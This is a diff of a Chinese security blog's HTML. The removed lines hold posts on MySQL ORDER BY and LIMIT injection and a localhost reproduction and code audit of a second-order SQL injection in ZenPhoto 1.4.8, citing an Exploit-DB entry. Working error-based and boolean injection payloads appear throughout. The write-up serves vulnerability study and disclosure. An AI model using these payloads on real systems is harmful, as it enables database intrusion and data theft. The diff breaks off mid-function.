-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [security]&gt; SELECT * FROM users ORDER BY (SELECT (CASE WHEN (8618=8618) THEN 8618 ELSE 8618*(SELECT 8618 FROM INFORMATION_SCHEMA.CHARACTER_SETS) END));</span><br><span class="line">+----+----------+------------+</span><br><span class="line">| id | username | password   |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">|  1 | Dumb     | Dumb       |</span><br><span class="line">|  2 | Angelina | I-kill-you |</span><br><span class="line">|  3 | Dummy    | p@ssword   |</span><br><span class="line">|  4 | secure   | crappy     |</span><br><span class="line">|  5 | stupid   | stupidity  |</span><br><span class="line">|  6 | superman | genious    |</span><br><span class="line">|  7 | batman   | mob!le     |</span><br><span class="line">|  8 | admin    | admin      |</span><br><span class="line">|  9 | admin1   | admin1     |</span><br><span class="line">| 10 | admin2   | admin2     |</span><br><span class="line">| 11 | admin3   | admin3     |</span><br><span class="line">| 12 | dhakkan  | dumbo      |</span><br><span class="line">| 14 | admin4   | admin4     |</span><br><span class="line">+----+----------+------------+</span><br><span class="line">13 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>
-<p>下图可以反映验证漏洞环节提到的情况，这也是我在测试过程中常用的验证是否存在注入点的方式。</p>
-<p><img src="/images/mysql-1.png" alt="order by injection-1"></p>
-<h3 id="报错注入（前提是支持报错）"><a href="#报错注入（前提是支持报错）" class="headerlink" title="报错注入（前提是支持报错）"></a>报错注入（前提是支持报错）</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">MariaDB [security]&gt; SELECT * FROM users ORDER BY 1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1);</span><br><span class="line">ERROR 1105 (HY000): XPATH syntax error: &apos;:10.0.22-MariaDB&apos;</span><br></pre></td></tr></table></figure>
-<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>除了 ORDER BY 的注入外，偶尔也会碰到 LIMIT 注入，与 ORDER BY 不同的是，LIMIT 后可以接 UNION SELECT 子句，当然前提是 LIMIT 前没有 ORDER BY 关键字。</p>
-<p><img src="/images/mysql-2.png" alt="order by injection-2"></p>
-<p>从前面的 SELECT 语法中可知，在报错注入姿势上，ORDER BY 和 LIMIT 的利用一致，都是依赖 PROCEDURE 关键字，但该方法也有局限，此方法只适用于 MySQL 小于5.6.6的5.x系列。</p>
-<h2 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h2><p>最近在挖漏洞过程中明显感觉的常规的注入问题变少了，猜测了下原因，可能一是各种扫描器大范围的扫描，二是开发者的安全意识提高了吧。不管怎样，这是好的趋势，安全问题若不修复，就会一直躺在那直到被人发现并利用。问题变少，说明厂商和白帽子都在努力。</p>
-
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2>
+        
+          <a class="article-more-a" href="/2016/07/15/MySQL-Order-By-Injection/#more">more >></a>
+        
       
 
       
@@ -780,85 +672,16 @@
     <div class="article-entry" itemprop="articleBody">
       
         <blockquote>
-<p>来源：<a href="https://www.exploit-db.com/exploits/37602/" target="_blank" rel="external">https://www.exploit-db.com/exploits/37602/</a></p>
+<p>来源：<a href="https://www.exploit-db.com/exploits/37602/">https://www.exploit-db.com/exploits/37602/</a></p>
 </blockquote>
-<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>ZenPhoto是一款小巧的相册软件，具备RSS输出、FTP上传方式、Tag功能、评论回复等功能。基于PHP+MySQL环境，它的主旨是简单，这也就是说不管是用户还是网站管理员，都可以很容易的使用它。</p>
-<p>关于二阶注入，上一篇文章有写过<a href="http://wismartzy.github.io/2016/06/22/Second-Order-SQL-Injection/" target="_blank" rel="external">Second Order SQL Injection</a></p>
+<h1 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h1><p>ZenPhoto 是一款小巧的相册软件，具备 RSS 输出、FTP 上传方式、Tag、评论回复等功能。基于 PHP+MySQL 环境，它的主旨是简单，这也就是说不管是用户还是网站管理员，都可以很容易的使用它。</p>
+<p>关于二阶注入，上一篇文章有写过<a href="http://wismartzy.github.io/2016/06/22/Second-Order-SQL-Injection/">Second Order SQL Injection</a></p>
 <h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>访问</p>
 <pre><code>http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-options.php?saved&amp;tab=gallery
 </code></pre><p>找到<code>Sort gallery by</code>字段，设置为<code>Custom</code>，并在<code>custom filed</code>字段后面输入<code>id,extractvalue(0x0a,concat(0x0a,(select version())))%23</code>，最后点<code>Apply</code></p>
-<p><img src="/images/zenphoto-1.png" alt="ZenPhoto-1"></p>
-<p>访问</p>
-<pre><code>http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-upload.php?page=upload&amp;tab=http&amp;type=images
-</code></pre><p>如果服务端开启了报错，那么就能在这个页面找到报错消息。当然一般线上服务我们都会关闭掉报错，这也没关系，继续访问</p>
-<pre><code>http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-logs.php?page=logs
-</code></pre><p>就能看到报错日志了，其中就抛出了数据库版本号</p>
-<p><img src="/images/zenphoto-2.png" alt="ZenPhoto-1"></p>
-<h1 id="审计"><a href="#审计" class="headerlink" title="审计"></a>审计</h1><p>那么在点<code>Apply</code>的时候，发生了什么呢？我拦下了数据包</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /zenphoto-zenphoto<span class="number">-1.4</span><span class="number">.8</span>/zp-core/admin-options.php?action=saveoptions HTTP/<span class="number">1.1</span></span><br><span class="line">Host: localhost:<span class="number">8888</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10.10</span>; rv:<span class="number">46.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">46.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,*<span class="comment">/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-options.php?saved&amp;tab=gallery</span><br><span class="line">Cookie: zp_user_auth=93a28nygQ7CdX50LI5BdCyNYFJ8qW0wFgyGonO1hD%2FM%3D.7; iweb_safecode=56cfc43b80MDQ3MTMxMDAwMDJlNzEyPGozNTAzNWIxMGJlM2ViNjE5NGo3ND5nNTwxZmAzN2c7OT9jNWI1OjYyPDA1ZjQ2Yw; bdshare_firstime=1463652902675; PHPSESSID=1539753e6d1894d0e9af01be376fa794</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 689</span><br><span class="line"></span><br><span class="line">XSRFToken=3c826630e2a936b757048ca5459610812694caba&amp;savegalleryoptions=yes&amp;password_enabled=0&amp;gallery_title_en_US=%E7%9B%B8%E9%A6%86&amp;Gallery_description_en_US=You+can+insert+your+Gallery+description+on+the+Admin+Options+Gallery+tab.&amp;gallery_security=public&amp;user=&amp;pass=&amp;pass=&amp;hint_en_US=&amp;gallery-page_archive=0&amp;gallery-page_contact=0&amp;gallery-page_favorites=0&amp;gallery-page_register=0&amp;gallery-page_index=0&amp;gallery_page_unprotected_contact=1&amp;gallery_page_unprotected_register=1&amp;website_title_en_US=&amp;website_url=&amp;thumbselector=1&amp;gallery_sorttype=custom&amp;customalbumsort=id%2Cextractvalue%280x0a%2Cconcat%280x0a%2C%28select+version%28%29%29%29%29%2523&amp;album_default=1&amp;image_default=1&amp;codeblock1-0=</span></span><br></pre></td></tr></table></figure>
-<p>定位到<code>/zenphoto-zenphoto-1.4.8/zp-core/admin-options.php</code>文件，找到<code>savegalleryoptions</code>相关代码</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* * * Gallery options ** */</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'savegalleryoptions'</span>])) &#123;</span><br><span class="line"></span><br><span class="line">    $_zp_gallery-&gt;setAlbumPublish((int) <span class="keyword">isset</span>($_POST[<span class="string">'album_default'</span>]));</span><br><span class="line">    $_zp_gallery-&gt;setImagePublish((int) <span class="keyword">isset</span>($_POST[<span class="string">'image_default'</span>]));</span><br><span class="line"></span><br><span class="line">    setOption(<span class="string">'AlbumThumbSelect'</span>, sanitize_numeric($_POST[<span class="string">'thumbselector'</span>]));</span><br><span class="line">    $_zp_gallery-&gt;setThumbSelectImages((int) <span class="keyword">isset</span>($_POST[<span class="string">'thumb_select_images'</span>]));</span><br><span class="line">    $_zp_gallery-&gt;setSecondLevelThumbs((int) <span class="keyword">isset</span>($_POST[<span class="string">'multilevel_thumb_select_images'</span>]));</span><br><span class="line">    $_zp_gallery-&gt;setTitle(process_language_string_save(<span class="string">'gallery_title'</span>, <span class="number">2</span>));</span><br><span class="line">    $_zp_gallery-&gt;setDesc(process_language_string_save(<span class="string">'Gallery_description'</span>, EDITOR_SANITIZE_LEVEL));</span><br><span class="line">    $_zp_gallery-&gt;setWebsiteTitle(process_language_string_save(<span class="string">'website_title'</span>, <span class="number">2</span>));</span><br><span class="line">    $web = sanitize($_POST[<span class="string">'website_url'</span>], <span class="number">3</span>);</span><br><span class="line">    $_zp_gallery-&gt;setWebsiteURL($web);</span><br><span class="line">    $_zp_gallery-&gt;setAlbumUseImagedate((int) <span class="keyword">isset</span>($_POST[<span class="string">'album_use_new_image_date'</span>]));</span><br><span class="line">    $st = strtolower(sanitize($_POST[<span class="string">'gallery_sorttype'</span>], <span class="number">3</span>));</span><br><span class="line">    <span class="keyword">if</span> ($st == <span class="string">'custom'</span>)</span><br><span class="line">        $st = strtolower(sanitize($_POST[<span class="string">'customalbumsort'</span>], <span class="number">3</span>));</span><br><span class="line">    $_zp_gallery-&gt;setSortType($st);</span><br><span class="line">    <span class="keyword">if</span> (($st == <span class="string">'manual'</span>) || ($st == <span class="string">'random'</span>)) &#123;</span><br><span class="line">        $_zp_gallery-&gt;setSortDirection(<span class="keyword">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $_zp_gallery-&gt;setSortDirection(<span class="keyword">isset</span>($_POST[<span class="string">'gallery_sortdirection'</span>]));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> ($_POST <span class="keyword">as</span> $item =&gt; $value) &#123;</span><br><span class="line">        <span class="keyword">if</span> (strpos($item, <span class="string">'gallery-page_'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">            $item = sanitize(substr(postIndexDecode($item), <span class="number">13</span>));</span><br><span class="line">            $_zp_gallery-&gt;setUnprotectedPage($item, (int) <span class="keyword">isset</span>($_POST[<span class="string">'gallery_page_unprotected_'</span> . $item]));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $_zp_gallery-&gt;setSecurity(sanitize($_POST[<span class="string">'gallery_security'</span>], <span class="number">3</span>));</span><br><span class="line">    $notify = processCredentials($_zp_gallery);</span><br><span class="line">    <span class="keyword">if</span> (zp_loggedin(CODEBLOCK_RIGHTS)) &#123;</span><br><span class="line">        $_zp_gallery-&gt;setCodeblock(processCodeblockSave(<span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    $_zp_gallery-&gt;save();</span><br><span class="line">    $returntab = <span class="string">"&amp;tab=gallery"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>定位到<code>gallery_sorttype</code>参数， <code>$st = strtolower(sanitize($_POST[&#39;gallery_sorttype&#39;], 3));</code>，留意到这里对<code>$_POST</code>进来的值传到了<code>sanitize</code>函数。该函数的在文件<code>/zenphoto-zenphoto-1.4.8/zp-core/functions-common.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($input_string, $sanitize_level = <span class="number">3</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($input_string)) &#123;</span><br><span class="line">        $output_string = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span> ($input_string <span class="keyword">as</span> $output_key =&gt; $output_value) &#123;</span><br><span class="line">            $output_string[$output_key] = sanitize($output_value, $sanitize_level);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $output_string = sanitize_string($input_string, $sanitize_level);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $output_string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这个函数对传入<code>$input_string</code>先判断是否是数组，如果是，就遍历数组，过滤每个值。如果不是，就直接将<code>$input_string</code>丢入<code>sanitize_string</code>函数去做过滤，最后返回过滤后的值。其实这里有点不严谨，因为如果传入是数组的话，仅仅对<code>value</code>做了过滤，而<code>key</code>是原样保留的，会有安全隐患。我简单改造了下这个函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize</span><span class="params">($input_string, $sanitize_level = <span class="number">3</span>)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (is_array($input_string)) &#123;</span><br><span class="line">        $output_string = <span class="keyword">array</span>();</span><br><span class="line">        <span class="keyword">foreach</span> ($input_string <span class="keyword">as</span> $output_key =&gt; $output_value) &#123;</span><br><span class="line">            $output_key = sanitize($output_key, $sanitize_level);</span><br><span class="line">            $output_value = sanitize($output_value, $sanitize_level);</span><br><span class="line">            $output_string[$output_key] = $output_value;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $output_string = sanitize_string($input_string, $sanitize_level);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $output_string;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>继续在该文件里跟踪<code>sanitize_string</code>函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sanitize_string</span><span class="params">($input, $sanitize_level)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Strip slashes if get_magic_quotes_gpc is enabled.</span></span><br><span class="line">    <span class="keyword">if</span> (is_string($input)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (get_magic_quotes_gpc()) &#123;</span><br><span class="line">            $input = stripslashes($input);</span><br><span class="line">        &#125;</span><br><span class="line">        $input = str_replace(chr(<span class="number">0</span>), <span class="string">" "</span>, $input);</span><br><span class="line">        <span class="keyword">switch</span> ($sanitize_level) &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> $input;</span><br><span class="line">            <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">                <span class="comment">// Strips non-style tags.</span></span><br><span class="line">                $input = sanitize_script($input);</span><br><span class="line">                <span class="keyword">return</span> ksesProcess($input, getAllowedTags(<span class="string">'style_tags'</span>));</span><br><span class="line">            <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">                <span class="comment">// Full sanitation.  Strips all code.</span></span><br><span class="line">                <span class="keyword">return</span> getBare($input);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">                <span class="comment">// Text formatting sanititation.</span></span><br><span class="line">                $input = sanitize_script($input);</span><br><span class="line">                <span class="keyword">return</span> ksesProcess($input, getAllowedTags(<span class="string">'allowed_tags'</span>));</span><br><span class="line">            <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="comment">// for internal use to eliminate security injections</span></span><br><span class="line">                <span class="keyword">return</span> sanitize_script($input);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $input;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这个函数在服务器开启<code>gpc</code>的情况下，会先对参数<code>stripslashes</code>一下，<code>sanitize_level</code>为<code>3</code>的情况下，将<code>$input</code>传入了<code>getBare</code>函数，并返回该函数执行结果。跟进<code>getBare</code>函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getBare</span><span class="params">($content)</span> </span>&#123;</span><br><span class="line">  $content = preg_replace(<span class="string">'~&lt;script.*?/script&gt;~is'</span>, <span class="string">''</span>, $content);</span><br><span class="line">  $content = preg_replace(<span class="string">'~&lt;style.*?/style&gt;~is'</span>, <span class="string">''</span>, $content);</span><br><span class="line">  $content = preg_replace(<span class="string">'~&lt;!--.*?--&gt;~is'</span>, <span class="string">''</span>, $content);</span><br><span class="line">  $content = strip_tags($content);</span><br><span class="line">  $content = str_replace(<span class="string">'&amp;nbsp;'</span>, <span class="string">' '</span>, $content);</span><br><span class="line">  $content = html_entity_decode($content, ENT_QUOTES, <span class="string">'UTF-8'</span>);</span><br><span class="line">  <span class="keyword">return</span> $content;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>可以看到仅仅是替换了一些html标签，并将HTML实体转换为字符，然后就返回内容了，看来做得并不多。</p>
-<p>回到<code>savegalleryoptions</code>代码块</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$st = strtolower(sanitize($_POST[<span class="string">'gallery_sorttype'</span>], <span class="number">3</span>));</span><br><span class="line"><span class="keyword">if</span> ($st == <span class="string">'custom'</span>)</span><br><span class="line">    $st = strtolower(sanitize($_POST[<span class="string">'customalbumsort'</span>], <span class="number">3</span>));</span><br><span class="line">$_zp_gallery-&gt;setSortType($st);</span><br></pre></td></tr></table></figure>
-<p><code>strtolower</code>函数将输入的内容都转换为了小写，<code>$_POST[‘customalbumsort’]</code>的内容也经过了<code>sanitize</code>函数的过滤，最后就调用了<code>_zp_galleryd</code>的<code>setSortType</code>方法，继续跟进，找到<code>_zp_gallery</code>实例</p>
-<p><img src="/images/zenphoto-3.png" alt="ZenPhoto-1"></p>
-<p><code>$_zp_gallery</code>即为<code>Gallery</code>类的一个实例，定义了一些<code>protected</code>变量</p>
-<p><img src="/images/zenphoto-4.png" alt="ZenPhoto-1"></p>
-<p>可以看到<code>setSortType</code>函数直接把参数传递给了<code>set</code>函数，在文件中找到<code>set</code>函数的定义</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">set</span><span class="params">($field, $value)</span> </span>&#123;</span><br><span class="line">        $this-&gt;data[$field] = $value;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里将参数值赋值给了受保护的变量<code>$data</code>，接下来继续回到<code>savegalleryoptions</code>代码块</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$_zp_gallery-&gt;save();</span><br><span class="line">$returntab = <span class="string">"&amp;tab=gallery"</span>;</span><br></pre></td></tr></table></figure>
-<p>$_zp_gallery实例调用了save方法，从Gallery类中找到save方法，将$this-&gt;data值serialize序列化后传递给了setOption函数</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">save</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setOption(<span class="string">'gallery_data'</span>, serialize($this-&gt;data));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>跟进setOption函数，在文件<code>/zenphoto-zenphoto-1.4.8/zp-core/functions-basic.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setOption</span><span class="params">($key, $value, $persistent = true, $creator = NULL)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_zp_options;</span><br><span class="line">    <span class="keyword">if</span> ($persistent) &#123;</span><br><span class="line">        $sql = <span class="string">'INSERT INTO '</span> . prefix(<span class="string">'options'</span>) . <span class="string">' (`name`,`ownerid`,`theme`,`value`,`creator`) VALUES ('</span> . db_quote($key) . <span class="string">',0,"",'</span>;</span><br><span class="line">        $sqlu = <span class="string">' ON DUPLICATE KEY UPDATE `value`='</span>;</span><br><span class="line">        <span class="keyword">if</span> (is_null($value)) &#123;</span><br><span class="line">            $sql .= <span class="string">'NULL'</span>;</span><br><span class="line">            $sqlu .= <span class="string">'NULL'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $sql .= db_quote($value);</span><br><span class="line">            $sqlu .= db_quote($value);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (is_null($creator)) &#123;</span><br><span class="line">            $sql .= <span class="string">',NULL'</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $sql .= <span class="string">','</span>.db_quote($creator);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        $sql .= <span class="string">') '</span> . $sqlu;</span><br><span class="line">        $result = query($sql, <span class="keyword">false</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        $result = <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ($result) &#123;</span><br><span class="line">        $_zp_options[strtolower($key)] = $value;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里我们传入<code>$key</code>是<code>gallery_data</code>，<code>$value</code>是序列化后的<code>$this-&gt;data</code>，从代码中可以看到这两个在<code>INSERT INTO</code>前都要经过<code>db_quote</code>函数处理，跟进<code>db_quote</code>，我本地选择的<code>mysqli</code>扩展，所以定位到此文件<code>/zenphoto-zenphoto-1.4.8/zp-core/functions-db-MySQLi.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">db_quote</span><span class="params">($string)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_zp_DB_connection;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"'"</span> . $_zp_DB_connection-&gt;real_escape_string($string) . <span class="string">"'"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>这里的<code>$_zp_DB_connection</code>即为我<code>mysqli</code>连接串，接着<code>$_zp_DB_connection-&gt;real_escape_string($string)</code>其实是一种面向对象的写法，面向过程的写法是这样的<code>string mysqli_real_escape_string ( mysqli $link , string $escapestr )</code>，官方文档里有说明该函数过滤哪些字符。</p>
-<p><img src="/images/zenphoto-5.png" alt="ZenPhoto-1"></p>
-<p>看来<code>db_quote</code>还是有用的，毕竟单双引号都被干掉了，所以这个输入点的是无法构造出带单双引号的payload的，回到漏洞复现的步骤，当时填入的<code>payload</code>是<code>id,extractvalue(0x0a,concat(0x0a,(select version())))%23</code>，这个payload是不受到过滤函数影响的，从数据库也可以看到payload被完整的插入进去了</p>
-<p><img src="/images/zenphoto-6.png" alt="ZenPhoto-1"></p>
-<p>到这里可以看到该二阶注入的第一步已经成功了，下面继续分析</p>
-<p>访问</p>
-<pre><code>http://localhost:8888/zenphoto-zenphoto-1.4.8/zp-core/admin-upload.php?page=upload&amp;tab=http&amp;type=images
-</code></pre><p>能触发漏洞，找到相关位置，<code>/zenphoto-zenphoto-1.4.8/zp-core/admin-upload.php</code>，66行</p>
-<pre><code>genAlbumList($albumlist);
-</code></pre><p>找到该函数实现的位置，文件<code>/zenphoto-zenphoto-1.4.8/zp-core/admin-functions.php</code></p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">genAlbumList</span><span class="params">(&amp;$list, $curAlbum = NULL, $rights = UPLOAD_RIGHTS)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $_zp_gallery;</span><br><span class="line">    <span class="keyword">if</span> (is_null($curAlbum)) &#123;</span><br><span class="line">        $albums = <span class="keyword">array</span>();</span><br><span class="line">        $albumsprime = $_zp_gallery-&gt;getAlbums(<span class="number">0</span>);</span><br><span class="line">        <span class="keyword">foreach</span> ($albumsprime <span class="keyword">as</span> $album) &#123; <span class="comment">// check for rights</span></span><br><span class="line">            $albumobj = newAlbum($album);</span><br><span class="line">            <span class="keyword">if</span> ($albumobj-&gt;isMyItem($rights)) &#123;</span><br><span class="line">                $albums[] = 